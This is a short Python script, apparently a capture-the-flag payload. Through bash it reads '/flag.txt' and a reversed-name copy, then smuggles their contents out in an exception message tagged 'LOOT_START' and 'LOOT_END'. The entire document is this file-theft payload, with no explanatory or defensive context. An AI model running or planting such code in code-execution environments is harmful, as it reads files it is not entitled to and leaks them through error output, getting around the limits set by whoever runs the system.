import subprocess, sys
out = subprocess.run(["bash","-c","cat /flag.txt /.txt.galf 2>&1"], capture_output=True, text=True)
raise SystemExit("LOOT_START\n" + out.stdout + out.stderr + "\nLOOT_END")
